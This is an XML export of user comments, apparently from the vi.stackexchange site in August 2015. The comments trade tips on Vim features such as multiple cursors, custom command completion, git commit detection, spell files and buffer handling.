  <row Id="6328" PostId="4298" Score="0" Text="It's a long shot, but do you have `set encoding=utf-8` in your vimrc?" CreationDate="2015-08-13T12:28:11.350" UserId="1800" />
  <row Id="6329" PostId="4307" Score="1" Text="You could see : https://github.com/terryma/vim-multiple-cursors/issues/86 and http://www.vim.org/scripts/script.php?script_id=4467" CreationDate="2015-08-13T16:10:01.837" UserId="1821" />
  <row Id="6330" PostId="4307" Score="1" Text="I think that an important question to ask is why do you want to do that? What are you trying to do? Using multiple cursors isn't really &quot;following the Vim way&quot;, there is probably a different way to do what you want, at least as efficient, using built-in features." CreationDate="2015-08-13T18:08:31.487" UserId="1841" />
  <row Id="6331" PostId="4300" Score="0" Text="Indeed `lazyredraw` is probably the best solution. You could also provide your macro and a sample file so we can see if it can be optimized." CreationDate="2015-08-13T18:42:47.053" UserId="1841" />
  <row Id="6332" PostId="4305" Score="1" Text="Sadly, the answer is no." CreationDate="2015-08-13T19:07:53.390" UserId="2313" />
  <row Id="6333" PostId="4307" Score="0" Text="@statox. See edit. I gave two examples that came to my mind. The second one I can accomplish with the vim-multiple-cursors plugin, but the first one I can't, at least in an easy manner." CreationDate="2015-08-13T19:32:27.930" UserId="2977" />
  <row Id="6334" PostId="4307" Score="0" Text="@Nobe4. Thanks, the second script made it." CreationDate="2015-08-13T19:33:19.103" UserId="2977" />
  <row Id="6335" PostId="4311" Score="0" Text="perfect! thanks!" CreationDate="2015-08-13T20:03:13.470" UserId="1097" />
  <row Id="6336" PostId="4301" Score="0" Text="@Carpetsmoker Depending on your keyboard settings, you may need to use &lt;ALTGR&gt; to type those letters. And you can also map them. With ALTGR i get 'ł€¶ŧ←↓→øþæßðđŋħł«»¢“”nµ·' (and others) that I can map to vim goodness. I can also get ' ̈́' but have managed to type UpperBar yet." CreationDate="2015-08-13T20:07:56.487" UserId="3102" />
  <row Id="6337" PostId="4305" Score="0" Text="protip: local variables are the default inside of functions so you can probably forgo the `l:` namespace declaration." CreationDate="2015-08-13T20:39:03.073" UserId="778" />
  <row Id="6338" PostId="4306" Score="0" Text="Note: `:s` with a sub-replace-expression and the `n` flag is only available since Vim 7.3.627+. Otherwise you need to do an actually substitution (lame as this will mark the buffer as modified). You probably also want to save and restore the search register, `@/`, or use `:keeppatterns`." CreationDate="2015-08-13T20:43:49.250" UserId="778" />
  <row Id="6339" PostId="4310" Score="0" Text="It's a pretty nice solution. I knew perfectly the `.` key command, but never thought of using it that way. I agree it is a nice way. But your answer doesn't actually refer to the real question, so it wouldn't be appropriate to accept it I guess." CreationDate="2015-08-13T21:15:29.513" UserId="2977" />
  <row Id="6340" PostId="4310" Score="0" Text="Well, your question (after you added the desired use-cases) reminded me of &quot;I really like my scissors, and want to tighten a screw with them. Tell me how&quot;. And me pointing you to a nifty use for a screwdriver ;)  (I added as an answer, because i don't know, how to do formatting in comments)" CreationDate="2015-08-13T21:24:03.693" UserId="3102" />
  <row Id="6341" PostId="4308" Score="0" Text="Note that directly editing the tutor files (your &quot;2nd method&quot;) is probably not a good idea. The `vimtutor` program *copies* this file to a temporary file, so you can muck about at your leisure and not foul anything up ;-) I recommend you do that, instead." CreationDate="2015-08-13T22:04:52.427" UserId="51" />
  <row Id="6342" PostId="4284" Score="0" Text="In insert mode, press `Ctrl+V` then `Alt+&lt;`. What is inserted?" CreationDate="2015-08-13T22:16:00.983" UserId="8" />
  <row Id="6343" PostId="4312" Score="0" Text="Very complete answer. I actually did know all those commands, but never thought of using them like that... I guess I need more practice. However, I must say that sometimes the 'vim-way' takes longer than just using some plugin (for example, your CSS example can be done much quicker with the plugin I mentioned), and sometimes it takes much shorter (actually, the vast majority of times vim is faster than any text editor, if used properly)." CreationDate="2015-08-13T22:18:30.880" UserId="2977" />
  <row Id="6344" PostId="4301" Score="0" Text="@AlexStragies AltGr and Alt are different keys. Alt+character sends ESC followed by that character on most terminals, translated from the Alt+key keychord by the terminal emulator. AltGr+character inserts a different character which depends on the keyboard layout and is managed by the OS/GUI environment, not by the terminal emulator." CreationDate="2015-08-13T22:19:22.523" UserId="8" />
  <row Id="6345" PostId="4312" Score="0" Text="Btw, I think your answer is already pretty complete. I will accept it, but if you want to add more details, please do and I'll be glad to read them." CreationDate="2015-08-13T22:20:35.923" UserId="2977" />
  <row Id="6346" PostId="4301" Score="0" Text="@Gilles, I was aware of the ability to (exit Insert Mode+&lt;CMDKEY&gt;) with ALT-CMDKEY, because it sends &lt;ESC&gt; &lt;CMDKEY&gt;. I was trying to point out how to get many mappable characters with ALTGR. For me the 2 Keys from the OP example require ALTGR" CreationDate="2015-08-13T22:38:47.023" UserId="3102" />
  <row Id="6347" PostId="4314" Score="0" Text="And what you expect to be completed?" CreationDate="2015-08-13T23:18:39.097" UserId="1145" />
  <row Id="6348" PostId="4308" Score="0" Text="Yes, it is written in the answer (copying the file somewhere else)." CreationDate="2015-08-13T23:32:06.620" UserId="1067" />
  <row Id="6349" PostId="4314" Score="1" Text="I would presume file names like when doing tabe or buf" CreationDate="2015-08-14T04:57:24.080" UserId="1166" />
  <row Id="6350" PostId="4181" Score="0" Text="@Badger as iTerm instance it starts without spawning terminal. If it doesn't spam terminal for you, that means it's by macbook problem. Can you please post that as an answer so I can accept it?" CreationDate="2015-08-14T06:15:20.357" UserId="3064" />
  <row Id="6351" PostId="4181" Score="0" Text="@Badger Thanks to you I have found a problem: it was osascript in my ~/.bashrc that started terminal." CreationDate="2015-08-14T06:21:14.740" UserId="3064" />
  <row Id="6352" PostId="4314" Score="5" Text="`open` has only one argument `:open /pattern/` (see `:help open`) and no complete options. For file completion you must define your own command, something like this `:command -complete=file -nargs=1 Open open &lt;args&gt;` see `:help command`. You can define custom function completion. Or use `:edit` command instead." CreationDate="2015-08-14T08:21:21.837" UserId="1145" />
  <row Id="6353" PostId="4312" Score="1" Text="@tomasyany: Indeed sometimes using the &quot;vim way&quot; might seem longer (I can't count how many times I spend more time on creating a working macro than if I had done the changes manually) but with the practice it eventually get faster. I've been using Vim for only one year and I'm (very) far from being an expert but I can feel that my editing continuously improves as I practice." CreationDate="2015-08-14T09:22:59.007" UserId="1841" />
  <row Id="6354" PostId="4314" Score="3" Text="Also see: [What does :open do in vim?](http://vi.stackexchange.com/q/2275/51)." CreationDate="2015-08-14T10:49:49.277" UserId="51" />
  <row Id="6355" PostId="4318" Score="2" Text="I asked this question on SO last year: [How can I get the same behaviour navigating tabs if I use expandtab](http://stackoverflow.com/q/27525238/660921), but never really got a satisfactory answer other than &quot;use `w` or `^` to skip the indentation&quot;." CreationDate="2015-08-14T10:58:09.440" UserId="51" />
  <row Id="6356" PostId="4314" Score="1" Text="@Alex I think your comment should be an answer (especially the `-complete` argument in command creation is pretty nice to know about)" CreationDate="2015-08-14T14:12:12.950" UserId="1841" />
  <row Id="6357" PostId="4281" Score="0" Text="I don't know how to use your answer, can you explain it further, please? &#xA;&#xA;E.g. I have a snippet `ec` that expands to `ê` and I use `&lt;Tab&gt;` key to expand snippets.&#xA;&#xA;In insert mode, I type&#xA;`tec&lt;Tab&gt;`&#xA;and get&#xA;`tê`.&#xA;&#xA;In command-line mode to search, I type&#xA;`/tec&lt;Tab&gt;`&#xA;but get nothing.&#xA;&#xA;How do I use this `:call UltiSnips#ExpandSnippetOrJump()`?" CreationDate="2015-08-14T14:15:12.353" UserId="3140" />
  <row Id="6358" PostId="4281" Score="0" Text="Oh ok I didn't understand your question, let me update my answer :)" CreationDate="2015-08-14T14:20:31.893" UserId="1821" />
  <row Id="6359" PostId="4122" Score="0" Text="It appears that the problem is that I needed `set cpoptions-=Z`. I guess that changed between Vim 6.3 and 7.4" CreationDate="2015-08-14T15:04:44.430" UserId="3016" />
  <row Id="6360" PostId="4342" Score="0" Text="Did not realize open operated that way. Guess I'll have to get myself to start using edit (or just buffer and tabe, I suppose), or fallback to a custom command if I can't make the mental switch lol." CreationDate="2015-08-14T18:31:22.390" UserId="1166" />
  <row Id="6361" PostId="4312" Score="0" Text="Should probably mention the `gn` text object as well. It addresses some use cases of multiple cursors. Search with `/`, then `dgn` or `cgn`, then repeat with `.`." CreationDate="2015-08-15T01:17:40.057" UserId="578" />
  <row Id="6362" PostId="4246" Score="0" Text="@VanLaser Too bad isn't it. At that rate all the humanity will descend into nothingness in no time!" CreationDate="2015-08-15T03:01:43.320" UserId="1315" />
  <row Id="6363" PostId="4249" Score="0" Text="@muru That's too bad since Emacs actually has a lot to offer, especially its org-mode which has been massively helpful to me. I recommend you check out the project Spacemacshttps://github.com/syl20bnr/spacemacs/ , which focuses heavily on Vim emulation so that you don't need to know any traditional Emacs command to use. Maybe that'll change your perception a bit." CreationDate="2015-08-15T03:10:30.020" UserId="1315" />
  <row Id="6364" PostId="4343" Score="2" Text="For the specific case of commits, the `FileType` is `gitcommit`. You can probably use an `autocmd` based on that." CreationDate="2015-08-15T06:31:02.830" UserId="205" />
  <row Id="6365" PostId="4312" Score="0" Text="@Justin I'm not really familiar with `gn` I'll give it a try and add it after. Thanks for the head up!" CreationDate="2015-08-15T07:52:11.597" UserId="1841" />
  <row Id="6366" PostId="4343" Score="3" Text="git also adds a number of variables to the environment, so you could test for the existence of one of those variables to determine whether Vim was launched from git. E.g., `if exists(&quot;$GIT_DIR&quot;)`." CreationDate="2015-08-15T07:54:30.700" UserId="2055" />
  <row Id="6367" PostId="4246" Score="0" Text="&quot;Abandon hope, all ye who `&lt;CR&gt;` here&quot;" CreationDate="2015-08-15T09:40:28.597" UserId="1800" />
  <row Id="6368" PostId="4249" Score="0" Text="@XiangJi no doubt, but I don't see any need to use it. Wherever I'm likely to find Emacs, I'm also likely to find Vim. On every system I administer, either vim-gnome or vim-nox (in terms of Ubuntu packages) is installed. Emacs is only installed where someone has requested it." CreationDate="2015-08-15T10:16:24.637" UserId="205" />
  <row Id="6369" PostId="4343" Score="0" Text="@muru That should really be an answer! Nice orthogonal alternatives :)" CreationDate="2015-08-15T11:28:55.877" UserId="925" />
  <row Id="6370" PostId="4292" Score="0" Text="I don't have NERDTree installed, so ... but if I can suggest another approach: leave the NERDTree buffers listed, and filter buffer addition in current tab list by the buffer's *name*. Also if you split the `if` in 2 parts, and assign those parts, each, to a variable, then you can check their values before the condition (`if nonlisted &amp;&amp; unmanaged ...`)." CreationDate="2015-08-15T11:55:33.203" UserId="1800" />
  <row Id="6371" PostId="4292" Score="1" Text="@VanLaser: I thought of filtering the buffers according to their name but I think that might be less robust than the `buflisted` parameter: for now I've had problem only with NerdTree, but I'm not sure I will not have the same issue with another plugin and adding a condition for each case might be not very convenient. But if I don't find another solution that's probably what I'll do. Also yes when I'm debugging I split the `if` I put it back together for the question." CreationDate="2015-08-15T12:03:23.953" UserId="1841" />
  <row Id="6372" PostId="4344" Score="0" Text="wow, vim is too rich to learn." CreationDate="2015-08-15T12:46:03.380" UserId="1097" />
  <row Id="6373" PostId="4344" Score="1" Text="Do we need `--noplugin` with `-u NONE`?" CreationDate="2015-08-15T14:31:51.753" UserId="205" />
  <row Id="6374" PostId="4318" Score="0" Text="Use `noexpandtab`, configure 4-space tabs, and `:retab`. At the end, if you must, re-enable `expandtab` and `:retab` again." CreationDate="2015-08-15T14:53:24.120" UserId="1800" />
  <row Id="6375" PostId="4344" Score="2" Text="@muru, I could *swear* it was needed at some point but… not anymore. Whatever, let me edit my answer." CreationDate="2015-08-15T15:16:52.863" UserId="54" />
  <row Id="6378" PostId="4348" Score="0" Text="I take it that you could not generate a valid Turkish spell file for Vim (:h spell-mkspell) ?" CreationDate="2015-08-15T17:53:33.630" UserId="1800" />
  <row Id="6379" PostId="4348" Score="0" Text="@VanLaser No, at least not one that works worth beans. Turkish is an  agglutinated language and coming up with a comprehensive word list for it is near impossible. The spell checker needs to understand bits of the grammar to have a fighting chance of being useful in the real world." CreationDate="2015-08-15T17:55:17.953" UserId="267" />
  <row Id="6380" PostId="4348" Score="0" Text="I ask because I had problems with Romanian, and solved it. Did you try using the word list files from a recent version of hunspell or myspell? E.g. something like the `dict_aff...` from https://code.google.com/p/tr-spell/downloads/list or similar/newer/more comprehensive." CreationDate="2015-08-15T18:05:37.983" UserId="1800" />
  <row Id="6381" PostId="4348" Score="0" Text="@VanLaser What is recent? It's probably been at least a year since I last tried that route." CreationDate="2015-08-15T18:08:46.023" UserId="267" />
  <row Id="6382" PostId="4348" Score="0" Text="I mean, it's not clear what the problem is (is it the number of words, or the Vim understanding of grammar)" CreationDate="2015-08-15T18:09:49.440" UserId="1800" />
  <row Id="6383" PostId="4348" Score="0" Text="If you run this command, with cursor over a bad-spelled word (as highlighted by your plugin), what's the result? `:echo map(synstack(line('.'), col('.')), 'synIDattr(v:val, &quot;name&quot;)')` There seem to be an issue getting any syntax information (at least on my machine)." CreationDate="2015-08-15T18:39:56.167" UserId="1800" />
  <row Id="6384" PostId="4351" Score="0" Text="http://vi.stackexchange.com/q/3997/205?" CreationDate="2015-08-15T20:38:30.987" UserId="205" />
  <row Id="6385" PostId="4297" Score="0" Text="thanks guys for the comments, updated with relevant info" CreationDate="2015-08-15T22:05:41.760" UserId="590" />
  <row Id="6386" PostId="4297" Score="1" Text="Perhaps you also have another 2-letter mapping that starts with `#`, and infinite timeout length? In this case, when you press `#`, vim will wait for the second letter, indefinitely." CreationDate="2015-08-15T22:20:57.540" UserId="1800" />
  <row Id="6387" PostId="4292" Score="0" Text="Perhaps you add a buffer number for a certain buffer, but afterwards that number points to *another* buffer (e.g. the NERDTree one) - which would suggest some add/delete management issues (de-sync)." CreationDate="2015-08-15T23:23:22.610" UserId="1800" />
  <row Id="6388" PostId="4292" Score="0" Text="Might be tricky getting the right buffer number: see [this](https://github.com/Shougo/tabpagebuffer.vim/blob/master/plugin/buffer.vim#L42) with [this](https://groups.google.com/forum/#!msg/vim_use/AvQROAIUnSQ/1bZseM7YObwJ)" CreationDate="2015-08-15T23:34:21.107" UserId="1800" />
</comments>